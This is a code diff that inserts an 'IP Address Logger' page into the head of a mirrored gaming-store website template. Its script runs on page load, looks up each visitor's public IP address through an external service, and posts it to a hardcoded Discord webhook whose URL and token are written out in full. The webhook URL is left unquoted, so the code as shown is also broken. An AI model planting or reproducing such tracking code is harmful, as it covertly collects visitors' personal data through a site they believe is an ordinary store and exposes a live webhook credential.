@@ -7,7 +7,54 @@ Author URL: http://w3layouts.com
 	
 <link rel="icon" type="image/x-icon" href="icon.png">
 
-
+	
+	
+<!DOCTYPE html>
+<html>
+<head>
+  <title>IP Address Logger</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      var webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+      
+      $.getJSON('https://api.ipify.org?format=json', function(data) {
+        var ip = data.ip;
+        
+        var payload = {
+          "content": "IP Address Logger",
+          "embeds": [
+            {
+              "title": "IP Address",
+              "description": ip,
+              "color": 16711680
+            }
+          ]
+        };
+        
+        $.ajax({
+          url: https://discord.com/api/webhooks/1111324840528465972/uQgeqqqUwTGDH1Yp_FTWRAGLhZyS1BbcSvjj61gLyd2xr2DEmKLKE3eBE7oDeYIM2Ull,
+          type: 'POST',
+          data: JSON.stringify(payload),
+          contentType: 'application/json',
+          success: function() {
+            console.log('IP address sent to Discord webhook.');
+          },
+          error: function(xhr, status, error) {
+            console.error('Error sending IP address to Discord webhook:', error);
+          }
+        });
+      });
+    });
+  </script>
+</head>
+<body>
+  <h1>IP Address Logger</h1>
+  <p>This page will send your IP address to a Discord webhook when loaded.</p>
+</body>
+</html>
+	
+	
 <!-- Mirrored from p.w3layouts.com/demos_new/template_demo/20-12-2019/gaming_store-demo_Free/704026406/web/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 07 May 2023 12:46:16 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
